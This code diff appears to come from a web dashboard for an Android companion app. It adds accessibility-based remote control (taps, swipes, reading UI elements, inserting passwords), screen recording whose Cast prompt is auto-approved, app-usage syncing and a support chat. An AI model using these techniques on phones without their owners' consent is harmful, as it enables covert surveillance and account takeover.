+  const offX = (rect.width - dispW) / 2;
+  const offY = (rect.height - dispH) / 2;
+  return { rect, vw, vh, scale, dispW, dispH, offX, offY };
+}
+
+function clientToNormalized(video, clientX, clientY) {
+  const c = videoContentRect(video);
+  if (!c) return null;
+  const localX = clientX - c.rect.left - c.offX;
+  const localY = clientY - c.rect.top - c.offY;
+  if (localX < 0 || localY < 0 || localX > c.dispW || localY > c.dispH) return null;
+  return {
+    nx: Math.min(1, Math.max(0, localX / c.dispW)),
+    ny: Math.min(1, Math.max(0, localY / c.dispH)),
+    markerX: c.offX + localX,
+    markerY: c.offY + localY,
+  };
+}
+
+function showRcMarker(x, y, ok) {
+  const stage = document.getElementById("screen-stage");
+  const marker = document.getElementById("rc-touch-marker");
+  if (!stage || !marker) return;
+  marker.hidden = false;
+  marker.style.left = `${x}px`;
+  marker.style.top = `${y}px`;
+  marker.style.background = ok === false ? "rgba(220,38,38,0.55)" : "rgba(91,92,226,0.55)";
+  clearTimeout(showRcMarker._t);
+  showRcMarker._t = setTimeout(() => {
+    marker.hidden = true;
+  }, 650);
+}
+
+/**
+ * Wait for phone to ack a module command.
+ * Polls API (reliable) + optional Firestore snapshot; mid-wait FCM poke wakes the phone.
+ * @param {string} commandId
+ * @param {{ timeoutMs?: number }} [opts]
+ */
+async function waitModuleCommand(commandId, opts = {}) {
+  const deviceId = selectedWorkspaceDeviceId;
+  if (!firebaseUid || !deviceId || !commandId) {
+    throw new Error("Missing auth/device for command wait");
+  }
+  const timeoutMs = Math.min(Math.max(Number(opts.timeoutMs) || 45000, 5000), 90000);
+  const deadline = Date.now() + timeoutMs;
+  let poked = false;
+  let snapshotDone = null;
+  let unsub = null;
+
+  if (db) {
+    const ref = doc(db, "users", firebaseUid, "devices", deviceId, "moduleCommands", commandId);
+    snapshotDone = new Promise((resolve) => {
+      unsub = onSnapshot(
+        ref,
+        (snap) => {
+          if (!snap.exists()) return;
+          const data = snap.data() || {};
+          const status = String(data.status || "");
+          if (status === "acked" || status === "failed" || status === "expired" || status === "ignored") {
+            resolve({ commandId, ...data });
+          }
+        },
+        () => {
+          /* fall through to API poll */
+        }
+      );
+    });
+  }
+
+  try {
+    while (Date.now() < deadline) {
+      if (snapshotDone) {
+        const raced = await Promise.race([
+          snapshotDone.then((v) => ({ via: "snap", v })),
+          new Promise((r) => setTimeout(() => r({ via: "tick" }), 400)),
+        ]);
+        if (raced.via === "snap") return raced.v;
+      }
+
+      try {
+        const data = await api(
+          `/api/device/command/status?deviceId=${encodeURIComponent(deviceId)}&commandId=${encodeURIComponent(commandId)}`
+        );
+        const cmd = data?.command || data;
+        const status = String(cmd?.status || "");
+        if (status === "acked" || status === "failed" || status === "expired" || status === "ignored") {
+          return cmd;
+        }
+      } catch {
+        /* keep waiting */
+      }
+
+      if (!poked && Date.now() + timeoutMs - deadline > 2500) {
+        poked = true;
+        try {
+          await api("/api/device/command/poke", {
+            method: "POST",
+            body: JSON.stringify({ deviceId, commandId }),
+          });
+        } catch {
+          /* ignore */
+        }
+      }
+      await new Promise((r) => setTimeout(r, 450));
+    }
+  } finally {
+    try {
+      unsub?.();
+    } catch {
+      /* ignore */
+    }
+  }
+  const err = new Error(
+    "Command timed out — phone did not confirm remote control. Keep AutoReplyBot open, enable Accessibility + Remote Control, allow Remote Accessibility for this browser, then retry."
+  );
+  err.code = "TIMEOUT";
+  throw err;
+}
+
+/**
+ * @param {string} action
+ * @param {object} [payload]
+ * @param {{ wait?: boolean, timeoutMs?: number }} [opts]
+ */
+async function sendA11yCommand(action, payload = {}, opts = {}) {
+  const deviceId = selectedWorkspaceDeviceId;
+  const clientId = requireClientId();
+  if (!deviceId) throw new Error("Select a device first");
+  const video = document.getElementById("screen-video");
+  const videoMeta = {
+    videoWidth: Number(video?.videoWidth || 0),
+    videoHeight: Number(video?.videoHeight || 0),
+  };
+  const created = await api("/api/device/command", {
+    method: "POST",
+    body: JSON.stringify({
+      deviceId,
+      clientId,
+      action,
+      payload: { ...payload, ...videoMeta, clientId, normalized: true },
+    }),
+  });
+  const command = created?.command || created;
+  const commandId = command?.commandId;
+  if (!commandId) throw new Error("No commandId returned");
+
+  const wait = opts.wait !== false;
+  if (!wait) {
+    // Fire-and-forget gestures: still poke once so the phone drains quickly.
+    api("/api/device/command/poke", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, commandId }),
+    }).catch(() => {});
+    return command;
+  }
+
+  const result = await waitModuleCommand(commandId, {
+    timeoutMs: opts.timeoutMs || 45000,
+  });
+  if (result.status === "failed" || result.status === "ignored" || result.status === "expired") {
+    const err = new Error(result.errorMessage || result.errorCode || "Command failed");
+    err.code = result.errorCode;
+    throw err;
+  }
+  return result;
+}
+
+async function startRemoteControlSession() {
+  setRcStatus("Starting remote control…");
+  try {
+    await sendA11yCommand(
+      "A11Y_START_SESSION",
+      { durationMs: 30 * 60 * 1000 },
+      { wait: true, timeoutMs: 45000 }
+    );
+    rcSessionActive = true;
+    setRcStatus("Remote control active");
+  } catch (e) {
+    rcSessionActive = false;
+    const box = document.getElementById("rc-control-enabled");
+    if (box) box.checked = false;
+    const msg = e instanceof Error ? e.message : String(e);
+    setRcStatus("Remote control disabled");
+    if (/ACCESSIBILITY_REQUIRED|MODULE_DISABLED/i.test(msg) || e.code === "ACCESSIBILITY_REQUIRED") {
+      alert(
+        "Accessibility control is disabled on the phone.\n\n" +
+          "1) Phone → Management → Remote Control Setup\n" +
+          "2) Enable the Accessibility service in Android Settings\n" +
+          "3) Turn Remote Control ON in the app\n" +
+          "4) phone Permissions card → allow Remote Accessibility + Direct Touch\n\n" +
+          msg
+      );
+    } else if (/CAPABILITY_DENIED|remoteAccessibility/i.test(msg)) {
+      alert(
+        "This browser is not allowed to use Remote Control.\n\n" +
+          "Phone → phone Permissions card → enable Remote Accessibility Control.\n\n" +
+          msg
+      );
+    } else if (/TIMEOUT|timed out/i.test(msg) || e.code === "TIMEOUT") {
+      alert(
+        "Remote control timed out.\n\n" +
+          "• Keep the AutoReplyBot app open (not force-stopped)\n" +
+          "• Phone → enable Accessibility service + Remote Control ON\n" +
+          "• phone Permissions card → enable Remote Accessibility\n" +
+          "• Install the latest APK if the phone build is old\n" +
+          "• Then uncheck/check Remote Control again\n\n" +
+          msg
+      );
+    } else alert(msg);
+  }
+}
+
+async function stopRemoteControlSession(emergency) {
+  try {
+    await sendA11yCommand(emergency ? "A11Y_EMERGENCY_STOP" : "A11Y_STOP_SESSION", {});
+  } catch {
+    /* ignore */
+  }
+  rcSessionActive = false;
+  setRcStatus("View only");
+}
+
+async function refreshRcTree() {
+  setRcStatus("Loading elements…");
+  try {
+    const result = await sendA11yCommand("A11Y_TREE", {});
+    const summary = String(result.resultSummary || "");
+    const m = summary.match(/tree:(\d+)/);
+    const version = m ? m[1] : "";
+    const meta = document.getElementById("rc-tree-meta");
+    if (!version || !db || !firebaseUid || !selectedWorkspaceDeviceId) {
+      if (meta) meta.textContent = summary || "Tree requested";
+      setRcStatus("Remote control active");
+      return;
+    }
+    const treeRef = doc(
+      db,
+      "users",
+      firebaseUid,
+      "devices",
+      selectedWorkspaceDeviceId,
+      "accessibility",
+      `tree_${version}`
+    );
+    const treeSnap = await getDoc(treeRef);
+    const data = treeSnap.exists() ? treeSnap.data() : null;
+    rcTreeNodes = Array.isArray(data?.nodes) ? data.nodes : [];
+    if (meta) {
+      meta.textContent = `${data?.packageName || "app"} · ${rcTreeNodes.length} elements · v${version}`;
+    }
+    renderRcTreeList("");
+    setRcStatus("Remote control active");
+  } catch (e) {
+    setRcStatus(e instanceof Error ? e.message : String(e));
+  }
+}
+
+function renderRcTreeList(filter) {
+  const list = document.getElementById("rc-tree-list");
+  if (!list) return;
+  const q = String(filter || "").toLowerCase().trim();
+  const items = rcTreeNodes.filter((n) => {
+    if (!q) return n.clickable || n.editable || n.scrollable || n.checkable;
+    const hay = `${n.text || ""} ${n.contentDescription || ""} ${n.className || ""}`.toLowerCase();
+    return hay.includes(q);
+  }).slice(0, 80);
+  if (!items.length) {
+    list.textContent = "No matching elements.";
+    list.classList.add("muted");
+    return;
+  }
+  list.classList.remove("muted");
+  list.innerHTML = items
+    .map((n) => {
+      const label = escapeHtml(
+        (n.text || n.contentDescription || n.className || "element").slice(0, 80)
+      );
+      const flags = [
+        n.clickable ? "click" : "",
+        n.editable ? "edit" : "",
+        n.scrollable ? "scroll" : "",
+      ]
+        .filter(Boolean)
+        .join(" · ");
+      return `<button type="button" class="rc-tree-item" data-node-id="${escapeHtml(n.id)}">
+        <strong>${label}</strong><br/><span class="muted">${escapeHtml(flags || n.className || "")}</span>
+      </button>`;
+    })
+    .join("");
+  list.querySelectorAll(".rc-tree-item").forEach((btn) => {
+    btn.addEventListener("click", async () => {
+      const nodeId = btn.getAttribute("data-node-id");
+      if (!nodeId || !isRcEnabled()) return;
+      setRcStatus("Clicking element…");
+      try {
+        await sendA11yCommand("A11Y_NODE_ACTION", { nodeId, nodeAction: "CLICK" });
+        setRcStatus("Element clicked");
+      } catch (e) {
+        setRcStatus(e instanceof Error ? e.message : String(e));
+      }
+    });
+  });
+}
+
+function wireRemoteControlUi() {
+  const video = document.getElementById("screen-video");
+  const toggle = document.getElementById("rc-control-enabled");
+  toggle?.addEventListener("change", async () => {
+    if (toggle.checked) await startRemoteControlSession();
+    else await stopRemoteControlSession(false);
+  });
+  document.getElementById("btn-rc-back")?.addEventListener("click", () =>
+    sendA11yCommand("A11Y_GLOBAL_ACTION", { action: 1 }, { wait: false })
+      .then(() => setRcStatus("Back"))
+      .catch((e) => setRcStatus(e.message || String(e)))
+  );
+  document.getElementById("btn-rc-home")?.addEventListener("click", () =>
+    sendA11yCommand("A11Y_GLOBAL_ACTION", { action: 2 }, { wait: false })
+      .then(() => setRcStatus("Home"))
+      .catch((e) => setRcStatus(e.message || String(e)))
+  );
+  document.getElementById("btn-rc-recents")?.addEventListener("click", () =>
+    sendA11yCommand("A11Y_GLOBAL_ACTION", { action: 3 }, { wait: false })
+      .then(() => setRcStatus("Recents"))
+      .catch((e) => setRcStatus(e.message || String(e)))
+  );
+  document.getElementById("btn-rc-notif")?.addEventListener("click", () =>
+    sendA11yCommand("A11Y_GLOBAL_ACTION", { action: 4 }, { wait: false })
+      .then(() => setRcStatus("Notifications"))
+      .catch((e) => setRcStatus(e.message || String(e)))
+  );
+  document.getElementById("btn-rc-tree")?.addEventListener("click", () => refreshRcTree());
+  document.getElementById("btn-rc-stop")?.addEventListener("click", async () => {
+    const box = document.getElementById("rc-control-enabled");
+    if (box) box.checked = false;
+    await stopRemoteControlSession(true);
+  });
+  document.getElementById("btn-rc-set-text")?.addEventListener("click", async () => {
+    const text = document.getElementById("rc-text-input")?.value || "";
+    try {
+      await sendA11yCommand("A11Y_SET_TEXT", { text });
+      setRcStatus("Text / password inserted");
+      const input = document.getElementById("rc-text-input");
+      if (input) input.value = "";
+    } catch (e) {
+      setRcStatus(e instanceof Error ? e.message : String(e));
+    }
+  });
+  document.getElementById("btn-rc-clear-text")?.addEventListener("click", async () => {
+    try {
+      await sendA11yCommand("A11Y_SET_TEXT", { text: "" });
+      setRcStatus("Field cleared");
+    } catch (e) {
+      setRcStatus(e instanceof Error ? e.message : String(e));
+    }
+  });
+  document.getElementById("rc-text-show")?.addEventListener("change", (ev) => {
+    const input = document.getElementById("rc-text-input");
+    if (!input) return;
+    input.type = ev.target?.checked ? "text" : "password";
+  });
+  document.getElementById("rc-tree-search")?.addEventListener("input", (ev) => {
+    renderRcTreeList(ev.target?.value || "");
+  });
+
+  if (!video) return;
+
+  video.addEventListener("pointerdown", (ev) => {
+    if (!isRcEnabled()) return;
+    const mode = document.getElementById("rc-gesture-mode")?.value || "tap";
+    if (mode === "swipe" || mode === "drag") {
+      const p = clientToNormalized(video, ev.clientX, ev.clientY);
+      if (!p) return;
+      rcDragStart = p;
+      video.setPointerCapture?.(ev.pointerId);
+    }
+  });
+
+  video.addEventListener("pointerup", async (ev) => {
+    if (!isRcEnabled()) return;
+    const mode = document.getElementById("rc-gesture-mode")?.value || "tap";
+    const end = clientToNormalized(video, ev.clientX, ev.clientY);
+    if (!end) return;
+    showRcMarker(end.markerX, end.markerY, true);
+    try {
+      if ((mode === "swipe" || mode === "drag") && rcDragStart) {
+        const dx = Math.abs(end.nx - rcDragStart.nx);
+        const dy = Math.abs(end.ny - rcDragStart.ny);
+        // Tiny movement while in Swipe mode = accidental click → treat as Tap
+        // (this was opening neighboring icons like PhonePe → Paytm).
+        if (dx < 0.025 && dy < 0.025) {
+          setRcStatus("Tap…");
+          await sendA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+          setRcStatus("Tap sent");
+          rcDragStart = null;
+          return;
+        }
+        setRcStatus(mode === "drag" ? "Dragging…" : "Swiping…");
+        await sendA11yCommand(
+          mode === "drag" ? "A11Y_DRAG" : "A11Y_SWIPE",
+          {
+            nx1: rcDragStart.nx,
+            ny1: rcDragStart.ny,
+            nx2: end.nx,
+            ny2: end.ny,
+            durationMs: mode === "drag" ? 400 : 250,
+          },
+          { wait: false }
+        );
+        setRcStatus("Gesture ok");
+        rcDragStart = null;
+        return;
+      }
+      const now = Date.now();
+      if (mode === "double" || (mode === "tap" && now - rcLastClickAt < 280)) {
+        setRcStatus("Double tap…");
+        await sendA11yCommand("A11Y_DOUBLE_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+      } else if (mode === "long" || ev.button === 2) {
+        setRcStatus("Long press…");
+        await sendA11yCommand(
+          "A11Y_LONG_PRESS",
+          { nx: end.nx, ny: end.ny, durationMs: 700 },
+          { wait: false }
+        );
+      } else {
+        setRcStatus("Tap…");
+        await sendA11yCommand("A11Y_TAP", { nx: end.nx, ny: end.ny }, { wait: false });
+      }
+      rcLastClickAt = now;
+      setRcStatus("Tap sent");
+    } catch (e) {
+      showRcMarker(end.markerX, end.markerY, false);
+      setRcStatus(e instanceof Error ? e.message : String(e));
+    } finally {
+      rcDragStart = null;
+    }
+  });
+
+  video.addEventListener("contextmenu", (ev) => {
+    if (isRcEnabled()) ev.preventDefault();
+  });
+
+  video.addEventListener("wheel", async (ev) => {
+    if (!isRcEnabled()) return;
+    ev.preventDefault();
+    const p = clientToNormalized(video, ev.clientX, ev.clientY);
+    if (!p) return;
+    const dy = ev.deltaY > 0 ? 0.18 : -0.18;
+    try {
+      await sendA11yCommand(
+        "A11Y_SWIPE",
+        {
+          nx1: p.nx,
+          ny1: Math.min(0.85, Math.max(0.15, p.ny)),
+          nx2: p.nx,
+          ny2: Math.min(0.95, Math.max(0.05, p.ny + dy)),
+          durationMs: 220,
+        },
+        { wait: false }
+      );
+    } catch (e) {
+      setRcStatus(e instanceof Error ? e.message : String(e));
+    }
+  }, { passive: false });
+}
+
+wireRemoteControlUi();
+
 document.getElementById("btn-rec-start")?.addEventListener("click", async () => {
   try {
     const deviceId = selectedWorkspaceDeviceId;
@@ -4859,24 +8528,24 @@ document.getElementById("btn-rec-start")?.addEventListener("click", async () => 
     setRecButtonUi("recording");
     setRecStatus("Waiting for Permission");
     setRecTimerDisplay(0);
+    stopLocalRecTimer();
     await api("/api/device/recordings/command", {
       method: "POST",
       body: JSON.stringify({ deviceId, clientId, op: "START", quality, fps, withMic }),
     });
-    setRecStatus("Recording");
-    startLocalRecTimer(0);
     const transferBox = document.getElementById("rec-transfer");
     if (transferBox) {
       transferBox.hidden = false;
       transferBox.textContent =
-        "Approve screen capture on the phone, then watch the timer. Tap Stop (red) when finished.";
+        "Approve Cast on the phone (auto-approved when Accessibility is on). Status becomes Recording when capture starts.";
     }
+    // Wait for phone Firestore status — do not fake "Recording" locally.
     startRecordingsPoll(180000);
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e);
     applyRecUiFromStatus("Failed", 0);
     if (/screenRecord|CAPABILITY_DENIED/i.test(msg)) {
-      alert("Enable Screen Recording for this browser on the phone Trusted Browsers list.\n\n" + msg);
+      alert("Enable Screen Recording for this browser on the phone phone Permissions card list.\n\n" + msg);
     } else alert(msg);
   }
 });
@@ -4898,6 +8567,7 @@ document.getElementById("btn-rec-pause")?.addEventListener("click", async () => 
     startRecordingsPoll(180000);
   } catch (e) {
     alert(e instanceof Error ? e.message : String(e));
+    startRecordingsPoll(60000);
   }
 });
 document.getElementById("btn-rec-resume")?.addEventListener("click", async () => {
@@ -4924,6 +8594,7 @@ document.getElementById("btn-rec-resume")?.addEventListener("click", async () =>
     startRecordingsPoll(180000);
   } catch (e) {
     alert(e instanceof Error ? e.message : String(e));
+    startRecordingsPoll(60000);
   }
 });
 document.getElementById("btn-rec-stop")?.addEventListener("click", async () => {
@@ -4941,6 +8612,17 @@ document.getElementById("btn-rec-stop")?.addEventListener("click", async () => {
         op: "STOP",
       }),
     });
+    // Retry STOP once — older phones sometimes drop the first control intent.
+    setTimeout(() => {
+      api("/api/device/recordings/command", {
+        method: "POST",
+        body: JSON.stringify({
+          deviceId: selectedWorkspaceDeviceId,
+          clientId: preferredClientId(cachedClients),
+          op: "STOP",
+        }),
+      }).catch(() => {});
+    }, 1200);
     setRecStatus("Encoding");
     startRecordingsPoll(180000);
   } catch (e) {
@@ -4949,6 +8631,7 @@ document.getElementById("btn-rec-stop")?.addEventListener("click", async () => {
   }
 });
 document.getElementById("btn-rec-refresh")?.addEventListener("click", () => refreshRecordingsPanel());
+document.getElementById("btn-rec-inline-close")?.addEventListener("click", () => closeRecInlineViewer());
 setRecButtonUi("idle");
 
 document.getElementById("btn-apps-refresh")?.addEventListener("click", () => refreshAppsPanel());
@@ -4984,7 +8667,7 @@ document.getElementById("btn-apps-sync")?.addEventListener("click", async () => 
       alert(
         "Installed apps not allowed yet.\n\n" +
           "1) Phone → Permissions → Installed apps sharing ON\n" +
-          "2) Trusted Browsers → allow Installed Apps\n\n" +
+          "2) phone Permissions card → allow Installed Apps\n\n" +
           msg
       );
     } else alert(msg);
@@ -5010,3 +8693,612 @@ document.getElementById("apps-search")?.addEventListener("input", () => {
   window.__appsSearchT = setTimeout(() => refreshAppsPanel(), 300);
 });
 document.getElementById("apps-filter")?.addEventListener("change", () => refreshAppsPanel());
+
+document.getElementById("btn-app-usage-refresh")?.addEventListener("click", () => refreshAppUsagePanel());
+document.getElementById("btn-app-usage-sync")?.addEventListener("click", async () => {
+  try {
+    const deviceId = selectedWorkspaceDeviceId;
+    const clientId = requireClientId();
+    await api("/api/device/app-usage/sync", {
+      method: "POST",
+      body: JSON.stringify({ deviceId, clientId, days: 7 }),
+    });
+    setTimeout(() => refreshAppUsagePanel(), 4500);
+  } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    if (/appUsageHistory|CAPABILITY_DENIED|APP_USAGE|USAGE_ACCESS|FEATURE_DENIED/i.test(msg)) {
+      alert(
+        "Recent Apps not allowed yet.\n\n" +
+          "1) Phone → Permissions → Recent Apps history → allow Usage Access\n" +
+          "2) phone Permissions card → allow Recent Apps usage history\n\n" +
+          msg
+      );
+    } else alert(msg);
+  }
+});
+
+/* ——— Help / Support chat (website user ↔ Platform Admin) ——— */
+/** @type {object[]} */
+let supportMessages = [];
+/** @type {File | null} */
+let supportPendingFile = null;
+/** @type {ReturnType<typeof setInterval> | null} */
+let supportPollTimer = null;
+/** @type {ReturnType<typeof setInterval> | null} */
+let supportUnreadTimer = null;
+let supportChatOpen = false;
+let supportSending = false;
+let supportAiTyping = false;
+/** @type {ReturnType<typeof setTimeout> | null} */
+let supportTypingTimeout = null;
+
+function highlightSupportMessageText(raw) {
+  const escaped = escapeHtml(String(raw || ""));
+  const pattern =
+    /(₹\s?[\d,]+(?:\.\d+)?|\b(?:Rs\.?|INR)\s?[\d,]+(?:\.\d+)?\b|\b\d+\s*(?:days?|weeks?|months?|hours?|hrs?|minutes?|mins?)\b|\b\d+[–-]\d+\s*(?:hours?|days?)\b|\b(?:within|up to)\s+\d+\s*(?:hours?|days?)\b)/gi;
+  return escaped.replace(pattern, (match) => {
+    const lower = match.toLowerCase();
+    let cls = "support-hl-important";
+    if (/₹|rs|inr/i.test(match)) cls = "support-hl-price";
+    else if (/day|week|month|hour|hr|min|within|up to/i.test(lower)) cls = "support-hl-duration";
+    return `<mark class="support-hl ${cls}">${match}</mark>`;
+  });
+}
+
+function showSupportTyping() {
+  supportAiTyping = true;
+  if (supportTypingTimeout) clearTimeout(supportTypingTimeout);
+  supportTypingTimeout = setTimeout(() => {
+    supportAiTyping = false;
+    renderSupportMessages();
+  }, 60000);
+  renderSupportMessages();
+  startSupportMessagePoll();
+}
+
+function stopSupportTyping() {
+  supportAiTyping = false;
+  if (supportTypingTimeout) {
+    clearTimeout(supportTypingTimeout);
+    supportTypingTimeout = null;
+  }
+  startSupportMessagePoll();
+}
+
+function setSupportStatus(text) {
+  const el = document.getElementById("support-chat-status");
+  if (el) el.textContent = text || "";
+}
+
+function updateSupportFabBadge(n) {
+  const badge = document.getElementById("support-fab-badge");
+  if (!badge) return;
+  const count = Math.max(0, Number(n) || 0);
+  if (count <= 0) {
+    badge.hidden = true;
+    badge.textContent = "0";
+    return;
+  }
+  badge.hidden = false;
+  badge.textContent = count > 99 ? "99+" : String(count);
+}
+
+function openSupportImageViewer(url, fileName) {
+  openMediaViewer({
+    kind: "image",
+    contentType: "image/*",
+    downloadUrl: url,
+    fileName: fileName || "image",
+    displayName: fileName || "Support chat image",
+  });
+}
+
+function renderSupportMessages() {
+  const box = document.getElementById("support-chat-messages");
+  if (!box) return;
+  const nearBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 80;
+  if (!supportMessages.length && !supportAiTyping) {
+    box.innerHTML = `<p class="muted" style="margin:auto;text-align:center;">Say hello. You can also attach an image or video.</p>`;
+    return;
+  }
+  const html = supportMessages
+    .map((m) => {
+      const mine = m.senderRole === "user";
+      const isAi = Boolean(m.isAiAgent);
+      let meta;
+      if (mine) {
+        meta = `You · ${m.createdAt ? new Date(m.createdAt).toLocaleString() : ""}`;
+      } else if (isAi) {
+        meta = m.createdAt ? new Date(m.createdAt).toLocaleString() : "";
+      } else {
+        meta = `Admin · ${m.createdAt ? new Date(m.createdAt).toLocaleString() : ""}`;
+      }
+      const media = (m.attachments || [])
+        .map((a) => {
+          if (!a?.url) {
+            return `<div class="muted" style="font-size:0.8rem;">[Attachment unavailable]</div>`;
+          }
+          if (a.type === "video") {
+            return `<video class="support-msg-media" src="${escapeHtml(a.url)}" controls playsinline></video>`;
+          }
+          return `<button type="button" class="support-msg-media-btn" data-support-img="${escapeHtml(a.url)}" data-support-name="${escapeHtml(a.fileName || "image")}" title="Tap to zoom">
+            <img class="support-msg-media" src="${escapeHtml(a.url)}" alt="${escapeHtml(a.fileName || "image")}" />
+            <span class="support-zoom-hint">Tap to zoom</span>
+          </button>`;
+        })
+        .join("");
+      const text = m.text ? `<div>${highlightSupportMessageText(m.text)}</div>` : "";
+      return `<div class="support-msg ${mine ? "support-msg-user" : "support-msg-admin"}">${text}${media}<span class="support-msg-meta">${escapeHtml(meta)}</span></div>`;
+    })
+    .join("");
+  const typingHtml = supportAiTyping
+    ? `<div class="support-typing" aria-live="polite">
+        <span class="support-typing-dots" aria-hidden="true"><span></span><span></span><span></span></span>
+        <span class="support-typing-label">typing…</span>
+      </div>`
+    : "";
+  box.innerHTML = html + typingHtml;
+  box.querySelectorAll("[data-support-img]").forEach((btn) => {
+    btn.addEventListener("click", () => {
+      openSupportImageViewer(
+        btn.getAttribute("data-support-img") || "",
+        btn.getAttribute("data-support-name") || "image"
+      );
+    });
+  });
+  if (nearBottom || supportMessages.length < 3) {
+    box.scrollTop = box.scrollHeight;
+  }
+}
+
+async function refreshSupportUnread() {
+  if (!idToken) return;
+  try {
+    const data = await api("/api/device/support/thread");
+    updateSupportFabBadge(data?.thread?.unreadForUser || 0);
+  } catch {
+    /* ignore background unread errors */
+  }
+}
+
+async function loadSupportMessages(opts = {}) {
+  const after = opts.after || 0;
+  const prevAdminCount = supportMessages.filter((m) => m.senderRole === "admin").length;
+  const data = await api(
+    `/api/device/support/messages?limit=100${after ? `&after=${encodeURIComponent(String(after))}` : ""}`
+  );
+  const list = Array.isArray(data.messages) ? data.messages : [];
+  if (after > 0) {
+    const seen = new Set(supportMessages.map((m) => m.messageId));
+    for (const m of list) {
+      if (!seen.has(m.messageId)) supportMessages.push(m);
+    }
+  } else {
+    supportMessages = list;
+  }
+  const nextAdminCount = supportMessages.filter((m) => m.senderRole === "admin").length;
+  if (supportAiTyping && nextAdminCount > prevAdminCount) {
+    stopSupportTyping();
+  }
+  renderSupportMessages();
+}
+
+async function markSupportRead() {
+  try {
+    const data = await api("/api/device/support/read", {
+      method: "POST",
+      body: JSON.stringify({}),
+    });
+    updateSupportFabBadge(data?.thread?.unreadForUser || 0);
+  } catch {
+    /* ignore */
+  }
+}
+
+function clearSupportAttach() {
+  supportPendingFile = null;
+  const input = document.getElementById("support-file-input");
+  if (input) input.value = "";
+  const prev = document.getElementById("support-attach-preview");
+  if (prev) {
+    prev.hidden = true;
+    prev.textContent = "";
+  }
+}
+
+function setSupportAttachPreview(file) {
+  const prev = document.getElementById("support-attach-preview");
+  if (!prev) return;
+  if (!file) {
+    prev.hidden = true;
+    prev.textContent = "";
+    return;
+  }
+  prev.hidden = false;
+  const mb = (file.size / (1024 * 1024)).toFixed(2);
+  prev.textContent = `Attached: ${file.name} (${mb} MB) — will send with your next message.`;
+}
+
+async function fileToBase64(file) {
+  const buf = await file.arrayBuffer();
+  const bytes = new Uint8Array(buf);
+  let binary = "";
+  const chunk = 0x8000;
+  for (let i = 0; i < bytes.length; i += chunk) {
+    binary += String.fromCharCode(...bytes.subarray(i, i + chunk));
+  }
+  return btoa(binary);
+}
+
+/** Compress large images so they fit the API upload limit (~3MB). */
+async function prepareSupportUploadFile(file) {
+  const maxBytes = 2.8 * 1024 * 1024;
+  if (!file.type.startsWith("image/") || file.size <= maxBytes) {
+    return {
+      contentType: file.type || "application/octet-stream",
+      fileName: file.name,
+      dataBase64: await fileToBase64(file),
+      sizeBytes: file.size,
+    };
+  }
+  const bitmap = await createImageBitmap(file);
+  const maxDim = 1920;
+  let w = bitmap.width;
+  let h = bitmap.height;
+  const scale = Math.min(1, maxDim / Math.max(w, h));
+  w = Math.max(1, Math.round(w * scale));
+  h = Math.max(1, Math.round(h * scale));
+  const canvas = document.createElement("canvas");
+  canvas.width = w;
+  canvas.height = h;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(bitmap, 0, 0, w, h);
+  bitmap.close?.();
+  let quality = 0.85;
+  let blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", quality));
+  while (blob && blob.size > maxBytes && quality > 0.45) {
+    quality -= 0.1;
+    blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", quality));
+  }
+  if (!blob) throw new Error("Could not compress image");
+  const compressed = new File([blob], (file.name || "image").replace(/\.\w+$/, "") + ".jpg", {
+    type: "image/jpeg",
+  });
+  return {
+    contentType: "image/jpeg",
+    fileName: compressed.name,
+    dataBase64: await fileToBase64(compressed),
+    sizeBytes: compressed.size,
+  };
+}
+
+async function uploadSupportMedia(file, text) {
+  // Direct API upload (Admin SDK) — avoids browser CORS failures on GCS signed PUT.
+  const prepared = await prepareSupportUploadFile(file);
+  if (prepared.sizeBytes > 3 * 1024 * 1024) {
+    throw new Error("File is still too large after compression (max ~3MB). Try a smaller image.");
+  }
+  const result = await api("/api/device/support/upload", {
+    method: "POST",
+    body: JSON.stringify({
+      contentType: prepared.contentType,
+      fileName: prepared.fileName,
+      dataBase64: prepared.dataBase64,
+      text: text || "",
+    }),
+  });
+  return result.message;
+}
+
+async function sendSupportChat() {
+  if (supportSending || !idToken) return;
+  const input = document.getElementById("support-chat-input");
+  const text = String(input?.value || "").trim();
+  const file = supportPendingFile;
+  if (!text && !file) return;
+  supportSending = true;
+  setSupportStatus(file ? "Uploading…" : "Sending…");
+  try {
+    let message;
+    if (file) {
+      message = await uploadSupportMedia(file, text);
+      clearSupportAttach();
+    } else {
+      const data = await api("/api/device/support/messages", {
+        method: "POST",
+        body: JSON.stringify({ text }),
+      });
+      message = data.message;
+    }
+    if (input) input.value = "";
+    if (message) {
+      if (!supportMessages.some((m) => m.messageId === message.messageId)) {
+        supportMessages.push(message);
+      }
+      renderSupportMessages();
+      showSupportTyping();
+    } else {
+      await loadSupportMessages();
+      showSupportTyping();
+    }
+    setSupportStatus("Sent");
+  } catch (e) {
+    setSupportStatus(e instanceof Error ? e.message : String(e));
+  } finally {
+    supportSending = false;
+  }
+}
+
+function startSupportMessagePoll() {
+  if (supportPollTimer) {
+    clearInterval(supportPollTimer);
+    supportPollTimer = null;
+  }
+  const intervalMs = supportAiTyping ? 900 : 2500;
+  supportPollTimer = setInterval(async () => {
+    if (!supportChatOpen || !idToken) return;
+    try {
+      const last = supportMessages.length
+        ? Number(supportMessages[supportMessages.length - 1].createdAt || 0)
+        : 0;
+      if (last) await loadSupportMessages({ after: last });
+      else await loadSupportMessages();
+      await markSupportRead();
+    } catch {
+      /* ignore poll errors */
+    }
+  }, intervalMs);
+}
+
+function stopSupportChatPolling() {
+  if (supportPollTimer) {
+    clearInterval(supportPollTimer);
+    supportPollTimer = null;
+  }
+  if (supportUnreadTimer) {
+    clearInterval(supportUnreadTimer);
+    supportUnreadTimer = null;
+  }
+}
+
+function startSupportUnreadPolling() {
+  if (supportUnreadTimer) clearInterval(supportUnreadTimer);
+  void refreshSupportUnread();
+  supportUnreadTimer = setInterval(() => {
+    if (!supportChatOpen) void refreshSupportUnread();
+  }, 10000);
+}
+
+async function openSupportChat() {
+  const drawer = document.getElementById("support-chat-drawer");
+  if (!drawer || !idToken) return;
+  drawer.hidden = false;
+  supportChatOpen = true;
+  setSupportStatus("Loading…");
